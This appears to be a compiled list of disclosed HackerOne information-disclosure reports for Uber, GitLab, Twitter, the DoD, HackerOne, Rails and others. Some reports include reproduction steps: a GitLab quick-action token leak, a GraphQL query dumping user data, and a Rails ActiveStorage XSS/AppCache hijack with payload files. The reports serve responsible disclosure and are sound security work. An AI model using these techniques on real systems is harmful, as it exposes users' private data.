- **Disclosed:** 2019-09-25T12:50:17.441Z
- **CVE(s):** -

**Summary (team):**

Researcher has found the third-party repository with test data for internal services development.

---

### [Sensitive user information disclosure at bonjour.uber.com/marketplace/_rpc via the 'userUuid' parameter](https://hackerone.com/reports/542340)

- **Report ID:** `542340`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** Uber
- **Reporter:** @anandpingsafe
- **Bounty:** - usd
- **Disclosed:** 2019-09-09T15:20:17.011Z
- **CVE(s):** -

**Summary (team):**

It was possible for an attacker to insert another user’s UUID into the userUuid POST parameter when making a request to https://bonjour.uber.com/marketplace/_rpc?rpc=getConsentScreenDetails, allowing them to retrieve personal data from the victim user’s account, as well as the user's mobile auth token, which could allow them to make requests to mobile APIs as the victim.

Thanks again, @appsecure_in!

**Summary (researcher):**

Public API endpoint leaked mobile API token of a user by passing driver uuid/rider uuid in the request. Using the API token attacker could have gained full access to driver/rider account.

---

### [SMTP Failure Leads to Chain of Internal System Failure](https://hackerone.com/reports/642488)

- **Report ID:** `642488`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** Kartpay
- **Reporter:** @bb00x
- **Bounty:** - usd
- **Disclosed:** 2019-08-28T15:30:56.450Z
- **CVE(s):** -

**Summary (team):**

Kartpay Application uses the third Party SMTP Service to send the Email and while using the same application was not coded properly to handle the failure of SMTP. So it has been implemented once it was found and reported.

---

### [Public Github Repo Leaking Internal Credentials Leading To DiscoveryIQ Docker Access](https://hackerone.com/reports/631348)

- **Report ID:** `631348`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** Informatica
- **Reporter:** @vinothkumar
- **Bounty:** - usd
- **Disclosed:** 2019-08-06T11:40:23.702Z
- **CVE(s):** -

**Summary (team):**

Researcher has identified and reported public github repo leaking internal information.

---

### [Nginx misconfiguration leading to direct PHP source code download](https://hackerone.com/reports/268382)

- **Report ID:** `268382`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** GSA Bounty
- **Reporter:** @tolo7010
- **Bounty:** - usd
- **Disclosed:** 2019-07-29T17:01:53.757Z
- **CVE(s):** -

**Vulnerability Information:**

Poc:
https://www.data.gov/app/plugins/saml-20-single-sign-on/saml/config/config.php

---

### [[https://life.informatica.com] - information disclose ](https://hackerone.com/reports/312292)

- **Report ID:** `312292`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** Informatica
- **Reporter:** @modam3r5
- **Bounty:** - usd
- **Disclosed:** 2019-07-12T10:03:27.758Z
- **CVE(s):** -

**Summary (team):**

Researcher had discovered and reported an issues that leads to information disclosure.

---

### [Просмотр любых статей по их айди.](https://hackerone.com/reports/589400)

- **Report ID:** `589400`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** VK.com
- **Reporter:** @cheatboss
- **Bounty:** 200 usd
- **Disclosed:** 2019-07-11T18:04:55.499Z
- **CVE(s):** -

**Summary (team):**

Просмотр статей.

---

### [Wordpress Users Disclosure](https://hackerone.com/reports/625199)

- **Report ID:** `625199`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** Nextcloud
- **Reporter:** @abay
- **Bounty:** - usd
- **Disclosed:** 2019-07-01T09:32:11.233Z
- **CVE(s):** -

**Vulnerability Information:**

**Information**
Using REST API, we can see all the WordPress users/author with some of their information.

**Step to Reproduce**
You can get user info by entering below url in your browser: 
https://nextcloud.com/wp-json/wp/v2/users

Reference: [#356047](https://hackerone.com/reports/356047)

## Impact

Authors : LTR , LTREditor can be created scenario of doing bruteforce attacks to this users.

---

### [Employee's GitHub Token Found In Travis CI Build Logs](https://hackerone.com/reports/496937)

- **Report ID:** `496937`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** Superhuman (formerly Grammarly)
- **Reporter:** @karimpwnz
- **Bounty:** 5000 usd
- **Disclosed:** 2019-05-22T12:06:04.961Z
- **CVE(s):** -

**Summary (team):**

Our Security Team was notified by researchers who identified a valid leaked Github token in Travis CI logs that allow accessing a limited number of Grammarly repositories. We immediately revoked the token and conducted investigation together with the Github support team. Based on the available access log data, we have enough evidence to state that any other party did not use the token to access our repositories.

We want to thank @karimpwnz and @cdl for providing a detailed report, efficient communication, and further verification actions.

**Summary (researcher):**

We would like to thank Grammarly for their cooperation and generous bounty.

This report was a part of our research on Travis CI's attack surface: https://edoverflow.com/2019/ci-knew-there-would-be-bugs-here/

---

### [JSON serialization of any Project model results in all Runner tokens being exposed through Quick Actions](https://hackerone.com/reports/509924)

- **Report ID:** `509924`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** GitLab
- **Reporter:** @jobert
- **Bounty:** 12000 usd
- **Disclosed:** 2019-04-20T16:54:24.838Z
- **CVE(s):** -

**Vulnerability Information:**

The Quick Actions interpreter allows an attacker to reference a Project it does not have access to. The model attributes are then being serialized and returned to the user, which results in the Runner token (both encrypted and unencrypted) being returned to the user. This vulnerability is currently exploitable on GitLab.com.

# Proof of concept
The vulnerability is relatively straightforward to reproduce.

1. Create a project
1. Create an issue
1. Write `/move <full path of any other project>` and click "Comment", a request to `/:namespace/:project/notes` is submitted
1. Observe the JSON response that is being returned, which contains the serialized Project model:

```
HTTP/1.1 200 OK
Server: nginx
...

{
  "commands_changes": {
    "target_project": {
      "id": 11104317,
      "name": "	█████",
      "path": "█████",
      "description": "",
      "created_at": "2019-03-02T01:39:34.285Z",
      "updated_at": "2019-03-02T01:39:34.285Z",
      "creator_id": 3627572,
      "namespace_id": 4717826,
      "last_activity_at": "2019-03-02T01:39:34.285Z",
      "import_url": null,
      "visibility_level": 0,
      "archived": false,
      "merge_requests_template": null,
      "star_count": 0,
      "merge_requests_rebase_enabled": false,
      "import_type": null,
      "import_source": null,
      "avatar": {
        "url": null
      },
      "approvals_before_merge": 0,
      "reset_approvals_on_push": false,
      "merge_requests_ff_only_enabled": false,
      "issues_template": null,
      "mirror": false,
      "mirror_user_id": null,
      "ci_id": null,
      "shared_runners_enabled": true,
      "runners_token": "mzssqx69THU██████████",
      "build_coverage_regex": null,
      "build_allow_git_fetch": true,
      "build_timeout": 3600,
      "mirror_trigger_builds": false,
      "public_builds": true,
      "pending_delete": false,
      "last_repository_check_failed": null,
      "last_repository_check_at": null,
      "container_registry_enabled": true,
      "only_allow_merge_if_pipeline_succeeds": false,
      "has_external_issue_tracker": false,
      "repository_storage": "nfs-file28",
      "request_access_enabled": false,
      "has_external_wiki": false,
      "repository_read_only": null,
      "lfs_enabled": true,
      "only_allow_merge_if_all_discussions_are_resolved": false,
      "repository_size_limit": null,
      "service_desk_enabled": false,
      "printing_merge_request_link_enabled": true,
      "auto_cancel_pending_pipelines": "enabled",
      "last_repository_updated_at": "2019-03-02T01:39:34.285Z",
      "ci_config_path": null,
      "disable_overriding_approvers_per_merge_request": null,
      "delete_error": null,
      "storage_version": 2,
      "resolve_outdated_diff_discussions": false,
      "remote_mirror_available_overridden": null,
      "only_mirror_protected_branches": null,
      "pull_mirror_available_overridden": null,
      "jobs_cache_index": null,
      "external_authorization_classification_label": "",
      "mirror_overwrites_diverged_branches": null,
      "external_webhook_token": null,
      "pages_https_only": true,
      "packages_enabled": true,
      "merge_requests_author_approval": null,
      "pool_repository_id": null,
      "runners_token_encrypted": "A6nIFzMXZzDdfR5iu9hq6███████████████",
      "bfg_object_map": {
        "url": null
      },
      "merge_requests_require_code_owner_approval": null,
      "import_status": "none",
      "mirror_last_update_at": null,
      "mirror_last_successful_update_at": null,
      "import_error": null,
      "import_jid": null
    }
  },
  "valid": false,
  "errors": {
    "commands_only": [
      "Commands applied"
    ]
  }
}
```

## Impact

This vulnerability gives any user who can create an Issue or comment on one the ability to obtain Runner tokens of Projects. This allows any user to register a runner for a project, which may give the attacker access to secret project variables. Given how these variables are used, this may allow an attacker to deploy arbitrary code to a victim's environment.

---

### [Protected tweets exposure through the URL](https://hackerone.com/reports/491473)

- **Report ID:** `491473`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** X / xAI
- **Reporter:** @terjanq
- **Bounty:** 560 usd
- **Disclosed:** 2019-04-19T16:34:21.228Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary
Leaking sensitive information from protected tweets via a prepared website. This vulnerability could lead to exposure of information such as **credit card numbers**, **bank account numbers**, **phone numbers**, **tokens**, **specific words** or even the **whole phrases** but also the exposure of any additional information such as **mentioned users**, **tweet time frames**, **tweet locations** or  **hashtags**.

## Description
When searching for further **URL exposure** vulnerabilities on Twitter I noticed that a very unsafe URL redirect happens, depending on search results, when a user searches for some tweets. 

The endpoint I found is that:
> If there are no search results for a query e.g. https://twitter.com/search?q=veryveryunsaferedirect&src=typd the URL changes to https://twitter.com/search?f=tweets&q=secret%20from%3Aterjanq&src=typd and it doesn't when results were found. As can be spotted, the `f=tweets` parameter was added and hence that state can be leaked.

The detection of the URL change can be achieved in several ways, I will use the technique I already reported to Twitter in https://hackerone.com/reports/491243 and also described in https://terjanq.github.io/Bug-Bounty/Twitter/url-information-disclosure-q67svgtbqarv/index.html.

Thanks to *Advanced Search* option the attacker can obtain very detailed information about the victim's tweets when knowing their username even if the tweets are set as private. The full list of available options is as in the image below. 
https://i.imgur.com/xJeaixk.png

To make the *X-Search* attack more effective, the attacker can use logical operators `AND` and `OR` to narrow down the search area. For example, by using phrases like `1001 OR 1002 OR 1003 OR 1004 …` the attacker can use binary-search to extract all four-digit numbers in only few requests. However, I noticed that the limit for the number of words that can be used in the search is limited by 50. Nevertheless, that number is big enough to effectively extract those four-digit numbers -- it would only take around 300 requests to extract all of them and then by combining them in the correct order the whole phrases such as credit card number can be leaked. 

In the Proof of Concept, I have prepared an easy attack abusing this observation for three-digit ones.

## Steps To Reproduce:
  1. Prepare test twitter accounts and enable the option *Protect your Tweets* in the settings.
  2. Visit the https://terjanq.github.io/Bug-Bounty/Twitter/protected-tweets-exposure-efvju8i785y1/poc.html and click the button to start the PoC.
  3. Put phrases you want to find in your tweets and fill the field `from:` with your account's username and submit the form.
  4. When you are done with the previous step, click on the button `Fetch all 3-digit numbers from tweets` and wait for the timer to stop.
  5. You should see all the three-digit numbers from your tweets.

*Please note that the exploit can be coded much more efficiently. For example, instead of using one window to make the redirects several can be used to speed it up. Also due to the style it was written in, false-positives can appear when lags occur (it has primitive protection implemented for that case, but it's not perfect)*

## Impact: 
A regular user of Twitter can have **their protected tweets leaked** along with additional information such as **mentioned users**, **tweet time frames**, **tweet locations** etc.

## Supporting Material/References:
I made a short video demonstrating the PoC in action 
https://youtu.be/bSUS4THqssY

*I attached copies of the files required to run the PoC (main file poc.html) but they can also be accessed via https://terjanq.github.io/Bug-Bounty/Twitter/protected-tweets-exposure-efvju8i785y1/*

## Impact

A regular user of Twitter can have **their protected tweets leaked** along with additional information such as **mentioned users**, **tweet time frames**, **tweet locations** etc.

---

### [███ exposes sensitive shipment information to public web](https://hackerone.com/reports/389116)

- **Report ID:** `389116`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** U.S. Dept Of Defense
- **Reporter:** @cablej_dds
- **Bounty:** - usd
- **Disclosed:** 2019-04-08T16:01:33.989Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**

A subdomain of the ██████████ site exposes sensitive shipment information to the public web at ███/█████downloads/xfer_fak. Although I haven't been able to find too much info about this, it seems to be fairly sensitive and updated daily, containing over 500,000 lines just for 07/30/18. Information included looks to be many/all shipments routed under ██████:

```
The ██████████ system IS an
automated U S ████████ Command (███) and U S ███
Military ██████████ █████████ Command (████████) █████ management
web-based system ████████ IS the single manager of DoD ██████████
███ and IS responsible for acceptance and approval of████████ of
service from the U S ███ ████████ has developed the ███████
system as an automated web-based █████ █████ management
system With an integrated ███ ████ database ██████ provides an automated
electronic commerce capability for the procurement of █████
█████ services as well as a real time data feed to war fighters
```
████████]

Information exposed includes route information, contact names / phone numbers for each shipment, 
shipment cost, content information, hazmat risk, classification level (U or C or S, likely unclass / confidential / secret), and more.

Some interesting ones:

The first listed indicates████████ materials and originates from the [███████](████████), which is used to maintain ██████....

```
0                DOMESTIC FREIGHT ROUTING REQUEST AND ORDER
==============================================================================
Requestor..: ██████                           Ship ID..: ███
Phone / FAX: ██████████/                    From.....: 0
Agency ID..:               Ship.Type: B        Miles: 1676  Total Miles: 1745 

Origin: ████       ;█████              Destin: █████       ;████  
                                         
█████████ ██████     , ND SPLC: █████       ██████ ████████    , GA SPLC: █████████      
 Rail Siding: N     SCAC:                Rail Siding: N     SCAC:      
----- Nearest Rail Point -----------    ----- Nearest Rail Point -----------
                                        

SCAC Requested/Received: 999/7           Conveyances: 1          Urgent: N
███ Priority: 2               Sec. Risk..: C C C C C C C C C C C *
Availability Date......: 08/01/18        HazMat.....: H█████████ █████ 
Desired Delivery Date..: 08/03/18        Over Dimen.: n/a
Shipment Total WT/VOL..:    10187.00 Pds Disability.: None
Shipment Cube (CuFt)...:         489.00  Line Items.: 34
Movement Modes.........: B               Services...: ████████
Export.................: N               Type of RO.: D    Mil Svc Code: F


 Ship ID: █████████   CONVEYANCE DETAIL                    
 ------------------------------------------------------------------------------  
 Conv:  1               Mode [B] Other      Cube-Ft:    489  TotWt/Vol:   10187 
 Ordered Veh(s) [  1]   Cap Load   [N]      P/G/B:  P        Overweight:     N   
 Overdimensional: N Length:    0 Width:    0 Height:      0  Pallet Wt :         
 Equipment        [AV3]   [   ]   [   ]   [   ]   [   ]   [   ]   [   ]   [   ]  
                                                                                
 1. Commodity   [  062820] Radio, Radio-telephone or Televis               
    FAK         [  999912] Vehicles Moved:    Security Risk:   Y              
                                                                                
 2. Commodity   [16490001] Radioactive Materials, Articles Or    H██████       ███
    FAK         [        ] Vehicles Moved:    Security Risk:   Y              
                                                                                
 3. Commodity   [  061700] Electrical Appliances or Instrume               
    FAK         [  999912] Vehicles Moved:    Security Risk:   Y              
                                                                                
 4. Commodity   [  060535] Aerials or Antennas, or Parts the               
    FAK         [  999912] Vehicles Moved:    Security Risk:   Y              
                                                                                
 5. Commodity   [        ]                                                 
    FAK         [        ] Vehicles Moved:    Security Risk:                 
 ------------------------------------------------------------------------------  
```

```
0                DOMESTIC FREIGHT ROUTING REQUEST AND ORDER
==============================================================================
Requestor..: ████████                        Ship ID..: █████████
Phone / FAX: ███████/                    From.....: 0
Agency ID..:               Ship.Type: B        Miles: 2289  Total Miles: 2289 

Origin: ████████       ;████████              Destin: ██████████       ;███████  
                                         
██████████ , ███ SPLC: ████       ███ ████     , ████████: ██████████      
 Rail Siding: N     SCAC:                Rail Siding: N     SCAC:      
----- Nearest Rail Point -----------    ----- Nearest Rail Point -----------
                                        

SCAC Requested/Received: 45/1            Conveyances: 1          Urgent: N
█████████ Priority: 2               Sec. Risk..: S
Availability Date......: 07/30/18        HazMat.....: None
Desired Delivery Date..: 07/31/18        Over Dimen.: n/a
Shipment Total WT/VOL..:        1.00 Pds Disability.: None
Shipment Cube (CuFt)...:           1.00  Line Items.: 1
Movement Modes.........: K               Services...: CIS
Export.................: Y               Type of RO.: D    Mil Svc Code: F


 Ship ID: ████   CONVEYANCE DETAIL                    
 ------------------------------------------------------------------------------  
 Conv:  1               Mode [K] Other      Cube-Ft:      1  TotWt/Vol:       1 
 Ordered Veh(s) [  1]   Cap Load   [N]      P/G/B:  P        Overweight:     N   
 Overdimensional: N Length:    0 Width:    0 Height:      0  Pallet Wt :         
 Equipment        [QQ ]   [   ]   [   ]   [   ]   [   ]   [   ]   [   ]   [   ]  
                                                                                
 1. Commodity   [  063470] Tubes, vacuum, electronic or radi               
    FAK         [  999912] Vehicles Moved:    Security Risk:   Y              
                                                                                
 2. Commodity   [        ]                                                 
    FAK         [        ] Vehicles Moved:    Security Risk:                 
                                                                                
 3. Commodity   [        ]                                                 
    FAK         [        ] Vehicles Moved:    Security Risk:                 
                                                                                
 4. Commodity   [        ]                                                 
    FAK         [        ] Vehicles Moved:    Security Risk:                 
                                                                                
 5. Commodity   [        ]                                                 
    FAK         [        ] Vehicles Moved:    Security Risk:                 
 ------------------------------------------------------------------------------  
```

```

LINE ITEM DETAIL
------------------------------------------------------------------------------
NO  PK/VCL TYPE   NEW      COMMODITY LEN  WID  HGT  CUBE    QUANTITY  FCC STOP
      DESCRIPTION
------------------------------------------------------------------------------

 1.      1 CTN             999913     16   10   10      1        4-P         

      UN-ID.................: ████████
      PROPER SHIPPING NAME..: CARTRIDGES, POWER DEVICE
      UN CLASS..............:  1.4C
      FLASH POINT...........: 
      NET EXPLOSIVE QUANTITY: 1 LB
      REPORTABLE QUANTITY...: 
      PACKING GROUP.........: 
      TOTAL QUANTITY........: 0 LB

 2.      1 CTN             999913     10   10   16      1        3-P         

      UN-ID.................: ███████
      PROPER SHIPPING NAME..: CARTRIDGES, POWER DEVICE
      UN CLASS..............:  1.4C
      FLASH POINT...........: 
      NET EXPLOSIVE QUANTITY: 1 LB
      REPORTABLE QUANTITY...: 
      PACKING GROUP.........: 
      TOTAL QUANTITY........: 0 LB
```

## Step-by-step Reproduction Instructions

1. Visit ████/████downloads/xfer_fak.
2. Wait for the 30 mb response to download.
3. Observe that this lists over 500,000 lines of a daily summary of shipments. See above for several examples.

## Impact

Not sure of the full contextual impact, but it's safe to say that this info should definitely not be publicly accessible. Day-to-day logs of over 500k lines with details of every shipment.

---

### [AWS bucket leading to iOS test build code and configuration exposure](https://hackerone.com/reports/404822)

- **Report ID:** `404822`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** Slack
- **Reporter:** @kiyell
- **Bounty:** 1500 usd
- **Disclosed:** 2019-02-23T03:02:28.677Z
- **CVE(s):** -

**Summary (team):**

@kiyell discovered an open AWS bucket which hosted the source code of the iOS test application, as well as some configuration information and test data relating to that test build. No customer data was exposed or at risk, and we resolved and investigated this issue. Thank you @kiyell for a neat finding!

---

### [Confidential data of users and limited metadata of programs and reports accessible via GraphQL](https://hackerone.com/reports/489146)

- **Report ID:** `489146`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** HackerOne
- **Reporter:** @yashrs
- **Bounty:** - usd
- **Disclosed:** 2019-02-03T10:57:19.220Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
The GraphQL endpoint doesn't have access controls implemented properly.

**Description:**
Any attacker can get personally identifiable information of users of Hackerone such as email address, backup hash codes, facebook_user_id, account_recovery_phone_number_verified_at, totp_enabled, etc.

These are just some examples of fields which are getting leaked directly from GraphQL.

This is the request sent to GraphQL:

```
{
  id
  users()
  {
    total_count 
    nodes
    {
      _id
      name
      username
      email
      account_recovery_phone_number
      account_recovery_unverified_phone_number
      bounties
      {
        total_amount
      }
      otp_backup_codes
      i_can_update_username
      location
      year_in_review_published_at
      anc_triager
      blacklisted_from_hacker_publish
      calendar_token
      vpn_credentials
      {
        name
      }
      account_recovery_phone_number_sent_at
      account_recovery_phone_number_verified_at
      swag
      {
        total_count
      }
      totp_enabled
      subscribed_for_team_messages
      subscribed_for_monthly_digest
      sessions
      {
        total_count
      }
      facebook_user_id
      unconfirmed_email
    }
  }
```

Sample Response:
█████████

Please fix it.

Thanks,
Yash :)

## Impact

This could potentially leak many users' info

**Summary (team):**

On January 31st, 2019 at 7:16pm PST, HackerOne confirmed that two reporters were able to query confidential data through a GraphQL endpoint. This vulnerability was introduced on December 17th, 2018 and was caused by a backend migration to a class-based implementation of GraphQL types, mutations, and connections. The [class-based implementation introduced](http://graphql-ruby.org/schema/class_based_api) the `nodes` field by default on all connections. The `nodes` field, in contrast with `edges`, didn’t leverage any of the defenses HackerOne has implemented to mitigate the exposure of sensitive information.

Our investigation concluded that malicious actors did not exploit the vulnerability. No confidential data was compromised. A short-term fix was released on January 31st, 2019 at 9:46 PM, a little over 2 hours after the vulnerability was reproduced.

# Timeline

| **Date** | **Time (PST)** | **Action** |
|-------------|----------------|------------------------------------------------------------------------------------------------------------------|
| 2018-12-17 | 9:07 AM | Software containing bug deployed to production. |
| 2019-01-31 | 7:32 AM | Vulnerability submitted to HackerOne’s bug bounty program. |
| 2019-01-31 | 7:21 PM | HackerOne validated the report and started incident response. |
| 2019-01-31 | 8:25 PM | HackerOne identified which code change introduced the security vulnerability and started work on a patch. |
| 2019-01-31 | 9:46 PM | A patch was released mitigating the identified vulnerability. |
| 2019-01-31 | 11:46 PM | HackerOne confirmed the vulnerability was not abused by any malicious actors. |
| 2019-02-01 | 6:18 AM | The root cause of the vulnerability was identified and a long term mitigation was proposed. |
| 2019-02-01 | 5:08 PM | Long term mitigation was deployed to production. |
| 2019-02-03 | 2:34 AM | Impacted users were alerted that their information was exposed to the reporters who submitted the vulnerability. |

# Root Cause
HackerOne has a number of defenses in place to reduce the risk of over-exposing data through our GraphQL layer. The first notable defense is a separate database schema that limits the set of rows a user can query based on their current role. This significantly reduces the impact in case, for example, the result of `Report.all`, would be serialized and returned to the user. The second notable defense is attribute-level authorization depending on the role of the requester. This makes sure that when an object is serialized, for example a publicly disclosed report, the user is not able to obtain internal metadata of the report.

*Why upgrade?*
On December 17th, when the code change was put up for review, engineers noticed the addition of the `nodes` field. An assumption was made that the field behaved like a shortcut for `edges { node }` — which, in hindsight, was not the case. No manual testing was performed to make sure that the authorization model for `nodes` was similar to other connection types.

HackerOne’s engineering team decided to upgrade to the class-based implementation of `graphql-ruby` because the old .define-based implementation was lazy-loaded. This caused problems when hot reloading pieces of code in a development environment. The class-based implementation also performs better in most situations. The .define-style implementation is also deprecated by the maintainers of the gem (to be removed with GraphQL 2.0).

*Why didn’t we notice?*
The `nodes` field is a helper field for Relay, which is used by the frontend. Even though the field was introduced, HackerOne engineers hadn’t started using this in our frontend. This caused the addition to fly under the radar of other engineers. The go-to way to query data through connection types at HackerOne is to go through the `edges` field. Because engineers outside of the specific team who upgraded to the class-based implementation did not deem the change important enough, there was no communication to other engineering teams.

*Why was it exploitable?*
When a GraphQL query is deconstructed and turned into one or multiple SQL queries, it will cast the result of it into an array of stale objects and use the attribute-level authorization to scrub all data the current user isn’t authorized to see. Root cause analysis showed that this code path was only followed when the nodes were queried through the `edges` field.

**Query that followed the expected code path**
```
query {
  users() {
    edges {
      node {
        email
      }
    }
  }
}
```

During the GraphQL gem upgrade on December 17th, all GraphQL types, connections, and mutations were rewritten to a class-based implementation. This introduced the `nodes` field on every connection type [in HackerOne’s GraphQL schema](https://github.com/arkadiyt/bounty-targets-data/commit/cc4ce27dc1c92996191374f46312e4da5b7099c0#diff-8f06618eaa831640dfc824ff0cc29ebd). Instead of casting the result to an array with stale objects, the `nodes` field would result in an `ActiveRecord::Relation` object. The attribute-level authorization instrumentation would then incorrectly assume that the result was safe to be serialized, as it assumes the parent of the GraphQL field had already been scrubbed.

**Query that followed the unexpected code path**
```
query {
  users() {
    nodes {
      email
    }
  }
}
```

In the team’s investigation to determine whether this was exploited by malicious actors, the team concluded that the current logging level enabled them to answer two crucial questions: which GraphQL queries were executed and what information was transferred to the people proving the security vulnerability in the first place. These questions confirmed it was not exploited.

# Resolution and Recovery
At 7:21 PM PST, HackerOne successfully reproduced the vulnerability as described by the reporter. The responding team identified the code change that introduced the vulnerability and started working on a short-term mitigation at 8:25 PM. This mitigation was released at 9:46 PM. The short-term mitigation was to disable the `nodes` field [from every connection type](https://github.com/arkadiyt/bounty-targets-data/commit/dd90f110609bff572f15b62d29701195a3c2b3bf#diff-8f06618eaa831640dfc824ff0cc29ebd). An internal code rule was deployed to alert the incident responders in case a new connection type was added that had the `nodes` field enabled. At the time, the root cause of the vulnerability was still unclear.

On February 1st at 6:18 AM, the team concluded the root cause analysis of the identified vulnerability. A long-term fix was put up for discussion. This fix addressed the underlying problem of the lack of attribute-level protection for the `nodes` field. Going forward any connection type that is introduced will either be sanitized through the attribute-level authorization or will stop processing the request in case of an unexpected object to be returned.

The minimum bounty award for a critical vulnerability on hackerone.com is currently set to $15,000. Even though this vulnerability exposed confidential information, it was limited to user information and metadata of programs and reports. None of the exposed information could have led to the compromise of confidential vulnerability information. It did, however, allow actors to query a significant amount of information. Because of that, the team decided to award the reporters with $20,000 for uncovering this vulnerability and working with us throughout the process.

# Vulnerability Impact on Data
Sensitive information of multiple objects was exposed. Due to the two notable defenses as described in the Root Cause section, the scope of the information that was exposed was limited. Below is an overview of the objects and the confidential data that a user was able to access.

*Connection: users*
The GraphQL schema enables anyone to query the users on the platform. This is an intentional design decision. However, because every User object could be accessed, a significant amount of confidential information was accessible.

Below is an overview of all sensitive attributes that could be queried for every user on hackerone.com.

| **Sensitive attribute** | **Note** |
|------------------------------------------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| account_recovery_phone_number | The last two digits of a verified account recovery phone number. |
| account_recovery_unverified_phone_number | The complete unverified account recovery phone number. |
| address | Accessible when swag was awarded for a report the authenticated user had access to, regardless of their role (e.g. publicly disclosed report). |
| calendar_token | The secret calendar token that exposes when HackerOne challenges were scheduled for the user. [This does not expose customer names](https://hackerone.com/reports/488643). |
| duplicate_users | An array of possible duplicate accounts based on platform behavior. |
| email | The email address. |
| otp_backup_codes | An array of bcrypt-hashed OTP backup codes. |
| payout_preferences | A connection of the user’s payout preferences. This does **not** include bank account details. |
| reports | See Report connection for the scope and attributes that were exposed. |
| unconfirmed_email | The unconfirmed email address. |

*Connection: teams*
The secure database schema, by default, allows any user to query public programs (teams) and public external programs. Because of the relationship between external programs and HackerOne programs, this data set includes programs who may be running a private program. This means it was possible to obtain internal triage notes and the policy of a select number of private programs the user did not have access to. The reporters queried partial program information, but they did not obtain any sensitive information that warranted HackerOne to reach out to any customers.

| **Sensitive attribute** | **Note** |
|-----------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|
| average_bounty_lower_amount | The lower bound of the average bounty range. |
| average_bounty_upper_amount | The higher bound of the average bounty range. |
| base_bounty | The minimum bounty of a program. |
| bounties_total | The sum of awarded bounties in the entire lifetime of the program. |
| bug_count | The total number of resolved reports. |
| child_teams | A connection containing the hierarchy of teams. |
| first_response_time | A float containing the average time to first response. |
| goal_valid_reports | The goal of valid vulnerabilities per month the program set. |
| grace_period_remaining_in_days | The number of days the program has to recover from too many SLA failures to avoid their program being taken off HackerOne. |
| new_staleness_threshold | The internal SLA until a report is marked as an SLA miss when it hasn’t received a first response. |
| new_staleness_threshold_limit | The internal SLA until a report is marked as an SLA fail when it hasn’t received a first response. |
| policy | The program policy in raw markdown. |
| policy_html | The rendered program policy. |
| product_edition | The product edition the program uses. |
| report_submission_form_intro | The submission form introduction in raw markdown. |
| report_submission_form_intro_html | The rendered submission form introduction. |
| report_template | The default report template in raw markdown. |
| reporters | An array of user objects who have reporter access to the program. |
| resolution_time | A float containing the average time to resolution. |
| resolved_staleness_threshold | The internal SLA until a report is marked as an SLA miss when it hasn’t been resolved. |
| sla_failed_count | The number of reports failing the internal SLA. |
| structured_policy | A structured representation of the program policy. |
| structured_scopes | A connection that only disclosed an internal `reference` in case the user was authorized to see the structured scopes on the program page. |
| target_signal | A float representing the targeted signal of the program. |
| triage_bounty_management | A text field containing instructions for HackerOne’s triage team on how to handle bounty payments. |
| triage_enabled | A boolean field indicating whether the program uses HackerOne’s triage services. |
| triage_note | Internal triage notes in raw markdown. |
| triage_note_html | The rendered triage notes. |
| triage_time | A float containing the average time to triage. |
| triaged_staleness_threshold | The internal SLA until a report is marked as an SLA miss when it hasn’t been triaged. |
| triaged_staleness_threshold_limit | The internal SLA until a report is marked as an SLA fail when it hasn’t been triaged. |
| whitelisted_hackers | See `reporters`. |

*Connection: reports*
The reports data hasn’t been fully migrated to the secure database schema yet, which means that at the time the vulnerability was reported, only fully publicly disclosed and all reports the user participated in were accessible. This significantly reduced the number of report information that was exposed.

| **Sensitive attribute** | **Note** |
|-----------------------------|-----------------------------------------------------------------------------------------------|
| anc_reasons | An array of strings containing flags why the report was submitted to the HackerOne Human-Augmented Signal queue. |
| mediation_requested_at | A date/time field when mediation was requested. |
| pre_submission_review_state | A flag representing how Human-Augmented Signal responded to the report. |
| reference | An optional internal reference. |
| reference_link | An optional link to an internal ticket. |

Even though the reporters confirmed that they did not query more information than necessary to prove the vulnerability and that they have deleted the information, HackerOne has reached out to the people for which sensitive information was downloaded by the reporters.

**If your data was accessed during this incident, you have received a separate notification from HackerOne.**

# Preventative Measures
As part of our incident response process, we are conducting an internal review and analysis of the incident. We are taking the following actions to address the underlying causes of issues and to help prevent future occurrence:
* Consider leveraging the `graphql-ruby` gem hooks for built-in authorization callbacks to catch more edge cases
* Break the execution flow when an unexpected object is returned in the resolution of a connection field
* Reduce the complexity of connection type resolution

---

### [ActiveStorage service's signed URLs can be hijacked via AppCache+Cookie stuffing trick when using GCS or DiskService](https://hackerone.com/reports/407319)

- **Report ID:** `407319`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** Ruby on Rails
- **Reporter:** @rosa
- **Bounty:** - usd
- **Disclosed:** 2018-12-27T21:27:02.574Z
- **CVE(s):** CVE-2018-16477

**Vulnerability Information:**

`ActiveStorage` tries to force `content-disposition: attachment` for [a list of content-types](https://github.com/rails/rails/blob/2a470d73a75ebf8cd7975e469bd82586d9234442/activestorage/lib/active_storage/engine.rb#L33-L42), including `text/html`. However, `response-content-type` and `response-content-disposition` in GCS and DiskService's URLs aren't signed, which means an attacker can modify them at will. This is not the case for Azure or S3.

This can be exploited using `AppCache` and cookie bombing as follows:
1. Upload the following file as `ActiveStorage::Blob`
File: fallback.html
```
<html>
<script>
  alert('Your request to the page '+location.href+' is hijacked!');
</script>
</html>
```
Grab the service signed URL for it and modify content type and content disposition params to `text/html` and `inline`. 

2. Now upload this other file using that URL as fallback:
File: manifest.appcache
```
CACHE MANIFEST 
FALLBACK:
/bucket_name/ [fallback_url from previous step]
```
In the same way, grab the signed service URL and modify content disposition and type to ensure it's served inline and as `text/cache-manifest`. 

3. Finally, upload this file using the service URL for manifest.appcache:
File: main.html
```
<html manifest="[manifest_url from the manifest above]">
